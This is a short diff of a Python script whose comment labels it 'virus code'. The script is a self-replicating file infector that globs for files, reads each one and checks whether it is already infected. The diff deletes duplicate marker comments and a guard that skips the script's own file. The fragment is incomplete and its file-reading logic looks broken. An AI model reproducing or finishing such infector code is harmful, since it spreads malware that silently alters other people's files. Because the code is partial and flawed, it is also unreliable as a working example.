@@ -1,7 +1,5 @@
 print("Hello world")
 #start of virus code
-#start of virus code
-#start of virus code
 import glob,re,sys
 viruscode = []
 
@@ -37,10 +35,6 @@ for f in files:   #for each file this will do bellow things
     file = open(f,"r")
     filecode = file.readline()
     file.close()
-
-    if f == this_file_Location:
-        break
-
 
     infected = False
     for line in filecode:
